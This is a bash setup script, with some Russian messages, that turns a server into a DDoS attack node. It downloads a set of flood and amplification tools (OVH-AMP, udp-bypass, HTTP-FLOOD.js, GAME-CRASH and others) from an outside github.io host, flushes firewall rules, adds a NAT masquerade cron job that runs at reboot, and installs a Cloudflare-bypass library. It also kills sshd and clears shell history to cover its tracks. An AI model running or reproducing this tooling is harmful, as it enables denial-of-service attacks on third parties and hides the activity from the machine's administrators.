#!/bin/bash

INTERFACE=$(ip route show default | awk '/default/ {print $5}')

if [ -e ~/methods/ ]

then

    echo "Проверка каталога прошла успешно."

else

    echo "Каталога methods не существует, поэтому создается. Ожидайте так же. После успешного создания каталога запустите скрипт ещё раз."

    mkdir ~/methods

    kill "$$"

    exit

fi

case "$1" in

    install)

        clear

        echo "Node setup in progress."

        echo "Package updates."

        apt-get update -y >> /dev/null && apt-get upgrade -y >> /dev/null

        echo "Installing modules."

        apt-get install curl -y >> /dev/null
        apt-get install git -y >> /dev/null
        apt-get install golang -y >> /dev/null
        apt-get install perl -y >> /dev/null
        apt-get install python3 -y >> /dev/null
        apt-get install python2 -y >> /dev/null
        apt-get install python3-pip -y >> /dev/null
        apt-get install screen -y >> /dev/null
        apt-get install speedtest-cli -y >> /dev/null
        apt-get install net-tools -y >> /dev/null
        apt-get install nload -y >> /dev/null
        apt-get install btop -y >> /dev/null
        apt-get install nodejs -y >> /dev/null
        apt-get install npm -y >> /dev/null

        echo "Network reset."

        iptables -t mangle -F && iptables -X
        iptables -t nat -X && iptables -t mangle -X
        iptables -Z && iptables -t nat -Z && iptables -t mangle -Z

        echo "nameserver 1.1.1.1" > /etc/resolv.conf

        ulimit -n 999999
        ulimit -s 999999
        ulimit -i 999999

        echo "Scripts are loading."

        wget https://haker20szs.github.io/haker20szs/methods/OVH-AMP -O ~/methods/OVH-AMP 2> /dev/null
        wget https://haker20szs.github.io/haker20szs/methods/OVH-FLIDR -O ~/methods/OVH-FLIDR 2> /dev/null
        wget https://haker20szs.github.io/haker20szs/methods/fli.py -O ~/methods/fli.py 2> /dev/null
        wget https://haker20szs.github.io/haker20szs/methods/home.pl -O ~/methods/home.pl 2> /dev/null
        wget https://haker20szs.github.io/haker20szs/methods/GAME-CRASH -O ~/methods/GAME-CRASH 2> /dev/null
        wget https://haker20szs.github.io/haker20szs/methods/MertOVH -O ~/methods/MertOVH 2> /dev/null
        wget https://haker20szs.github.io/haker20szs/methods/stress -O ~/methods/stress 2> /dev/null
        wget https://haker20szs.github.io/haker20szs/methods/god.pl -O ~/methods/god.pl 2> /dev/null
        wget https://haker20szs.github.io/haker20szs/methods/AMP.pl -O ~/methods/AMP.pl 2> /dev/null
        wget https://haker20szs.github.io/haker20szs/methods/udp-bypass -O ~/methods/udp-bypass 2> /dev/null
        wget https://haker20szs.github.io/haker20szs/methods/udp-bypass-v2 -O ~/methods/udp-bypass-v2 2> /dev/null
        wget https://haker20szs.github.io/haker20szs/methods/HTTP-RAW.js -O ~/methods/HTTP-RAW.js 2> /dev/null
        wget https://haker20szs.github.io/haker20szs/methods/HTTP-FLOOD.js -O ~/methods/HTTP-FLOOD.js 2> /dev/null

        echo "Crontab setup in progress."

        chmod -R 777 ~/methods

        echo -e "#!/bin/bash

iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -t nat -A POSTROUTING -o ${INTERFACE} -j MASQUERADE
ethtool -s ${INTERFACE} duplex full speed 1000 autoneg off

echo 'nameserver 1.1.1.1' > /etc/resolv.conf

iptables-save

clear" > iptables.sh

        bash iptables.sh >> /dev/null

        (crontab -l ; echo '@reboot bash /root/iptables.sh') | crontab -

        chmod -R 777 ~/iptables.sh
        sudo npm install cloudscraper 2> /dev/null

        sudo hostnamectl set-hostname "westalbot"
        pkill -9 sshd

        clear
        history -c

        echo -e "✓ Success."

    ;;

    uninstall)

        clear

        echo "Files are deleted."

        apt-get update -y >> /dev/null && apt-get upgrade -y >> /dev/null && apt-get autoremove -y >> /dev/null
        rm -R ~/methods
        iptables -P INPUT ACCEPT && iptables -P OUTPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -t nat -F && iptables -t mangle -F && iptables -X && iptables -F

        crontab_content=$(crontab -l)
        new_crontab_content=$(echo "$crontab_content" | grep -v "@reboot bash /root/iptables.sh")

        echo "$new_crontab_content" | crontab -

        rm -R ~/iptables.sh

        clear
        history -c

        echo -e "✓ Success."

    ;;

    *)

        echo "Usage: {install >> uninstall}"

    ;;

esac

version_id=`cat /etc/*-release| tr "\n" " "`

for version_id in '22.04'

do
 
    if [ $version_id == '22.04' ];

        then

            echo "OS check was successful."

        else

            echo "This OS is not supported."

            kill "$$"

            exit
    
    fi
        

done